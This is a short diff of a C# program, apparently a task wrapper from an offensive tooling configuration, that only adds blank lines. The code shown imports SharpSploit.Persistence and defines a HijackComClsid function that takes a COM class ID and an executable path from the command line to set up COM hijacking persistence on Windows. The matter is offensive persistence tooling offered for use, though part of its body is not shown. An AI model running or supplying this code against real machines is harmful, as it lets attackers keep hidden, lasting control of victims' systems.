@@ -35,15 +35,18 @@ csharp:
     using System;
     using System.IO;
     using SharpSploit.Persistence;
+
     public static class Program
     {
         public static void Main(string[] args)
         {
             string clsid = args.Length > 0 ? args[0] : "";
             string executablePath = args.Length > 1 ? args[1] : "";
+
             string result = HijackComClsid(clsid, executablePath);
             Console.WriteLine(result);
         }
+
         public static string HijackComClsid(string clsid, string executablePath)
         {
             using (StringWriter stringWriter = new StringWriter())
@@ -63,6 +66,7 @@ csharp:
                 {
                     stringWriter.WriteLine(e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace);
                 }
+
                 return stringWriter.ToString();
             }
         }
